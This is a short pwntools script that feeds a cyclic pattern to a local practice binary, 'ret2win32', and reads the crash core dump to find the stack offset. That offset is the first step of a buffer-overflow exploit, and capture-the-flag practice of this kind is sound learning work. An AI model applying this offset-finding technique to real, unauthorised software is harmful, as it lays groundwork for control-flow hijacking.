from pwn import * 

p=process('./ret2win32')
p.send(cyclic(200, n=4))
p.wait()

core = p.corefile
value = core.read(core.esp, 4)
print(value)
print(cyclic_find(value, n=4))
